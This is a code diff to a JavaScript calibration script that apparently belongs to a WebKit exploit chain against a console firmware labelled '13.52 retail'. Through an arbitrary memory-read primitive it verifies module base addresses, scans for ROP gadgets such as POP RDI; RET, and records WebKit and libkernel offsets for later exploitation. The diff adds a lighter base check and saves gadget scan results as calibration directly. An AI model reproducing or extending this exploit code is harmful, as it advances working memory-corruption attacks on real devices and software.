@@ -19,7 +19,7 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827g";
+const BUILD_ID = "cal-20250827h";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -1021,6 +1021,38 @@ function checkOneGadget(p, base, row) {
     };
 }
 
+function verifyModuleBaseLite(p, startBase) {
+    const useBase = startBase;
+    const magic = read4p(p, useBase);
+    if (magic === ELF_MAGIC)
+        return { ok: true, base: useBase, line: "base ELF OK " + useBase };
+    const kind = classifyModulePage(p, useBase);
+    if (kind === "text" || kind === "data") {
+        return {
+            ok: true, base: useBase,
+            line: "base MODULE OK " + useBase + " kind=" + kind + " peek=" + fmtMagic(magic),
+        };
+    }
+    if (tableOff && tableOff.wk_POP_RDI_RET != null
+        && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
+        return {
+            ok: true, base: useBase,
+            line: "base GADGET OK " + useBase + " POP_RDI @+"
+                + tableOff.wk_POP_RDI_RET.toString(16),
+        };
+    }
+    if (manualBase) {
+        return {
+            ok: true, base: useBase,
+            line: "base MANUAL OK " + useBase + " peek=" + fmtMagic(magic),
+        };
+    }
+    return {
+        ok: false, base: useBase,
+        line: "base FAIL " + useBase + " got=" + fmtMagic(magic),
+    };
+}
+
 function verifyModuleBaseOnce(p, startBase) {
     let useBase = startBase;
     let magic = read4p(p, useBase);
@@ -1176,7 +1208,14 @@ function applyScannedGadgets(found, reportLines) {
     lines.push("json " + JSON.stringify(jsonParts));
     markGadgetReport(lines);
     clearVerifyProgress();
-    mark("HINT", "tap Verify all — uses scanned RVAs");
+    const delta = activeDelta();
+    const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, activeBase());
+    if (useDelta > 0 && Object.keys(found).length >= GADGET_CHECKS.length) {
+        applyCalibration(useDelta, activeBase(), null, GADGET_CHECKS.length, { fromScan: true });
+        mark("CAL-OK", "scan saved offsets — no Verify all needed");
+    } else {
+        mark("HINT", "scan done — or tap Verify all (lite, ~25 reads)");
+    }
 }
 
 async function runScanGadgets() {
@@ -1255,6 +1294,7 @@ async function runScanGadgets() {
 
 function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
     const assumed = opts && opts.assumed;
+    const fromScan = opts && opts.fromScan;
     const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base);
     if (!(useDelta > 0)) {
         mark("CAL-FAIL", "no expm1 delta for PASTE-OFFSETS");
@@ -1264,20 +1304,23 @@ function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
         delta: useDelta,
         webkitBase: base,
         libkernelBase: libkernelBase || null,
-        elf: assumed ? (opts.elfPeek === ELF_MAGIC) : true,
-        elfPeek: assumed ? opts.elfPeek : ELF_MAGIC,
+        elf: assumed ? (opts.elfPeek === ELF_MAGIC) : !!fromScan,
+        elfPeek: assumed ? opts.elfPeek : (fromScan ? read4p(window.p, base) : ELF_MAGIC),
         gadgetOk: gadgetOk || 0,
         gadgetTotal: GADGET_CHECKS.length,
         ok: true,
         assumed: !!assumed,
+        fromScan: !!fromScan,
     };
     calibrated = result;
     clearVerifyProgress();
     clearLkProgress();
     const live = {
-        fw_status: assumed
-            ? "assumed expm1 on hardware — not ELF/gadget verified"
-            : "calibrated on hardware (index_cal.html)",
+        fw_status: fromScan
+            ? "13.52 HW — expm1 + pop gadgets from scan"
+            : assumed
+                ? "assumed expm1 on hardware — not ELF/gadget verified"
+                : "calibrated on hardware (index_cal.html)",
         wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
         wk_expm1_builtin: result.delta,
         wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
@@ -1829,10 +1872,10 @@ async function runVerifyAll() {
     try {
         await new Promise(r => setTimeout(r, 64));
 
-        const baseResult = verifyModuleBaseOnce(p, base);
+        const baseResult = verifyModuleBaseLite(p, base);
         base = baseResult.base;
         const report = [
-            "build=" + BUILD_ID + " (verify)",
+            "build=" + BUILD_ID + " (verify-lite)",
             "base=" + base + (delta > 0 ? " expm1=0x" + delta.toString(16) : ""),
             baseResult.line,
         ];
@@ -1840,7 +1883,7 @@ async function runVerifyAll() {
         if (!baseResult.ok) {
             report.push("summary FAIL — bad base");
             markGadgetReport(report);
-            mark("HINT", "re-Start for vtable walk; or Set base + expm1 eb6350");
+            mark("HINT", "Set base manually or re-Start vtable walk");
             state("verify fail — bad base", "bad");
             return;
         }
@@ -1854,11 +1897,11 @@ async function runVerifyAll() {
             report.push(g.line);
             if (g.ok === true) verifyGadgetOk++;
             else if (g.ok === false) anyBad = true;
-            if ((gi & 1) === 1)
-                await new Promise(r => setTimeout(r, 0));
+            await new Promise(r => setTimeout(r, 32));
         }
         report.push("summary " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " OK");
 
+        await new Promise(r => setTimeout(r, 32));
         const lk = verifyLibkernelOnce(p, base);
         report.push(lk.line);
 
